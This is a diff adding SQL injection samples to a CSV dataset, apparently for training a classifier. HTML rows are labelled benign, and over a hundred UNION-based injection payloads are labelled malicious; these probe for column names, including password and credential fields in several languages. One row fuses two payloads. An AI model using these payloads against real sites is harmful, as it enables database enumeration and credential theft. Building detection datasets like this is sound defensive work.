@@ -1333,3 +1333,1339 @@ end,0
 "<LINK rel=""next"" href=""./next.html"">",0
 </HEAD>,0
 <BODY>,0
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT publisher_code FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OvRH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT setting FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NVwW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT format_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XNCD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT word FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JHgj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT slogan FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jeDg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT superssn FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xIjE",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT product FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JIcy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT referredby FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MOin 1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT operationid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pxor",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ban_ip FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Gziy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT p_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RUtc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lbl_aom_unaccessible_shipmethod FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XCuT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT origin FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GTGO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT comment_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZjIk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT product_version FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QoJy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT probe_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Hisa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT orderdate FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mqpe",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ordernumber FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DIsB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT data_type_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DWCk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT publisherid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eIjG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lake_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GpWX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT course_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fXZG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT questionid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ULaB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT student_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gUGY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kfge",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT answerid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QMDt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT hashtag FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fcEf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT preference_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WJKY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT author_num FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ARWi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT branch_num FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xJxs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT derived_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dPYm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT factoryid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IpUW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT filterid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CZcK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT log FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VyJc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pnumber FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dMDX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT specialtyid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vqbh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT plugin_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eDwX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aa FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ciJr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT file FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gwdw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dept_number FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hPLn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT action_attribute_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zogQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cpr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YmIU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT storeid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JllW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT progenitor_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MHBd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT staff_number FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RceU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT deptid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RDTt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT semester FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PnZD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT poi_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lbFb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT part_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Xcnr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cell_line_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TLrY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT transaction_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xzpV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT agentid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ukZW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT regionid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eyPI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT token FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kMDr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT serial_no FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qVJp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT experimental_data_set_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eOQG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cp_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Tpaw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT the_geom FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nXMZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT model FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NHqG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT o_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eYLm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT personid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vuUc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT display_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OkRw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT salesperson_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oOmZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dependent_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uXgJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT license FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pyjh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tablename FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BWMV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT employee_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PbKX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT e_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bcai",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_group FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PbMQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT location FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZBzj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bb FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QFSP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT languageid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Neue",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `int4` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- buum",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT msg_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UMQr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT department FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WpBJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT book_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CeSC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ingredientid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zHvz",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT action_type_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Ytte",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT maker FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- atlu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT app FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aGVg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_customer FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qaWT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT this FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JPUw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT entry_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AypS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT county_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZFHe",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT protocol_type_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XjtW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT empnbr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KVNk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT unit_number FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KqWE",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bar FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jKfI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT studentid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ugVo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dbid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ztmq",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT title_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iCJG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- steS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT emp_num FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HNKS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT owner FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KgeC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT course_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bhhX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT editionnumber FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fCtl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sessionid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iGyR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mealid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sFZt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT com_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vttR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT text FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SGPS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT chip_layout_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VjWt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT watchlistid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mfxT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT qty FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cDIF",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT data_set_type_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CcAQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT orderid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZagL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT module_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mlYz",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT c1 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EwYU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT domainid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LYmh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT course_no FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tJoY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mgrssn FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aCmD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_log FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FEmm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT access_control_type_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bsed",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT account_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GIcH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT checking FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Ewar",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT protocol_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SbNv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT request_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XXQj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gPqH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sale_date FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- epvA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT module_addr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HrZI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT flag FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vsOH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usuario FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gleX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nombre FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BrZu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT contrasena FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WVgL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT consumidor FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qmER",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT clave FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QwwQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT llave FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lFNF",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT chaveta FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XUZK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tono FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZwnM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cuna FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- spuN",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT benutzername FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sVxD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT benutzer FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sbik",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT passwort FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OPLQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kennwort FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kBMu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT parole FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fiYG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT losungswort FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DdLQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT losung FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SZBP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kennung FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TItB",1
